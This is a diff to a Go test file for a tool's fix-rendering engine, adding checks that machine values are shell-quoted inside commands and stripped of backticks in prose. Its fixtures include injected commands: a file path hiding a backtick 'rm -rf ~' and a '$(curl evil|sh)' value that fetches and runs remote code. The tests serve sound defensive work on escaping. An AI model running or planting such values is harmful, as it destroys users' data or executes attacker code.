@@ -107,11 +107,34 @@ func TestCleanEscapesControlCharacters(t *testing.T) {
 }
 
 func TestRenderFixNeutralisesBackticks(t *testing.T) {
-	it := engine.Item{"path": "/tmp/a`rm -rf ~`b", "stop_cmd": "a` · `b"}
-	if got := engine.RenderFix("Run `ls {path}`", it); got != "Run `ls /tmp/a'rm -rf ~'b`" {
-		t.Errorf("machine value kept a backtick: %q", got)
+	it := engine.Item{"path": "/tmp/a`rm -rf ~`b", "stop_cmd": "a` · `b", "plain": "/home/u/.aws/credentials"}
+	// Inside a command a machine value is one quoted shell word.
+	if got := engine.RenderFix("Run `ls {path}`", it); got != "Run `ls '/tmp/a'\\''rm -rf ~'\\''b'`" {
+		t.Errorf("machine value in a command: %q", got)
+	}
+	// In prose it only loses its backticks.
+	if got := engine.RenderFix("See {path}.", it); got != "See /tmp/a'rm -rf ~'b." {
+		t.Errorf("machine value in text: %q", got)
+	}
+	if got := engine.RenderFix("`chmod 600 {plain}`", it); got != "`chmod 600 /home/u/.aws/credentials`" {
+		t.Errorf("plain path should stay unquoted: %q", got)
 	}
 	if got := engine.RenderFix("`{stop_cmd}`", it); got != "`a` · `b`" {
 		t.Errorf("trusted markup field changed: %q", got)
+	}
+}
+
+func TestShellQuote(t *testing.T) {
+	cases := map[string]string{
+		"ssh/key.pem":      "ssh/key.pem",
+		"ssh/my key/a.pem": "'ssh/my key/a.pem'",
+		"$(curl evil|sh)":  "'$(curl evil|sh)'",
+		"it's":             `'it'\''s'`,
+		"":                 "''",
+	}
+	for in, want := range cases {
+		if got := engine.ShellQuote(in); got != want {
+			t.Errorf("ShellQuote(%q) = %q, want %q", in, got, want)
+		}
 	}
 }
